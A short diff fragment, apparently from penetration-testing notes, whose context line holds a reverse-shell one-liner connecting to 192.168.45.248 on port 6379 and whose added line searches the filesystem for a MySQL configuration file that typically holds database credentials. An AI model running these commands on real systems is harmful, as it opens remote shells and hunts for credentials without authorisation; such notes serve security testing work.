@@ -13,7 +13,7 @@ sh -i >& /dev/tcp/192.168.45.248/6379 0>&1
 ```
 
 ```
-
+find / -iname config-sample-mysql.php -type f 2>/dev/null
 ```
 
 ```
